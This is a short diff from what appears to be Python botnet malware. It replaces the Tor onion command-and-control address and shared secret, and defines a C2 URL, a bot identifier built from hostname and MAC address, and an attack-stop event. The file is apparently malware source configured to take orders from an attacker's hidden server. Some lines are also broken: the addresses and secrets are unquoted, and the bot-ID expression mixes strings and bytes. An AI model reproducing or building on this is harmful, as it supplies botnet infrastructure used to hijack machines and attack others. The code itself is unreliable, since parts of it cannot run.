@@ -17,8 +17,8 @@ import json
 import urllib.request
 import tarfile
 
-C2_ONION = zruun6ptse2pgw7337ow5sg22utkhvoxcarcsmb2cg275atldrhbszad.onion
-SHARED_SECRET = ad1f3ccd547dec42908fc2cdb5b400c1
+C2_ONION = njns5wsnjyzrvd6vtdlnyphu2of2uoqzuyjrpceaoglgdh6o356zceqd.onion
+SHARED_SECRET = 554a35a1a646aa79f84b5f9aa94f3c1b
 C2_URL = f"http://{C2_ONION}"
 BOT_ID = hashlib.md5((socket.gethostname() + str(uuid.getnode()).encode()).hex().encode()).hexdigest()[:12]
 ATTACK_STOP = threading.Event()
